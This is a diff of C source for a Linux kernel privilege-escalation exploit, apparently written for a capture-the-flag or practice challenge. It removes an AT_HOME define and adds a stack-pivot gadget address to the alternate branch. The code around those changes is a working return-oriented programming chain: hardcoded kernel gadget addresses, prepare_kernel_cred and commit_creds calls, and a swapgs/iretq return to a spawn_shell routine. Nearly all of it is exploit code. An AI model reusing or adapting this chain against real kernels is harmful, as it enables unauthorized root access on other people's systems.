@@ -11,8 +11,6 @@
 
 #define MAX_MSG 1024
 
-#define AT_HOME
-
 typedef struct read_write_stack{
 	unsigned long size;
 	long msg[MAX_MSG];
@@ -48,7 +46,7 @@ void save_state(){
 unsigned long user_rip = (unsigned long)spawn_shell;
 
 #ifdef AT_HOME
-unsigned long stacklift = 0xffffffff81458a59; // : mov esp, 0x5b000000 ; pop rbp ; ret
+unsigned long stacklift = 0xffffffff81458a59; // mov esp, 0x5b000000 ; pop rbp ; ret
 unsigned long newstack = 0x5b000000;
 unsigned long pop_rdi_ret = 0xffffffff81001568; // pop rdi; ret;
 unsigned long prepare_kernel_cred = 0xffffffff8108c220;
@@ -59,6 +57,8 @@ unsigned long commit_creds = 0xffffffff8108bde0;
 unsigned long swapgs_nop3_xor_ret = 0xffffffff81c01036; // swapgs; nop x 3; xor; ret;
 unsigned long iretq = 0xffffffff810261eb; // iretq
 #else
+unsigned long stacklift = 0xffffffff81457dc9; // mov esp, 0x5b000000 ; pop rbp ; ret
+unsigned long newstack = 0x5b000000;
 unsigned long pop_rdi_ret = 0xffffffff81001568; // pop rdi; ret;
 unsigned long prepare_kernel_cred = 0xffffffff8108c240;
 unsigned long pop_rdx_ret = 0xffffffff8101c946; // pop rdx; ret;
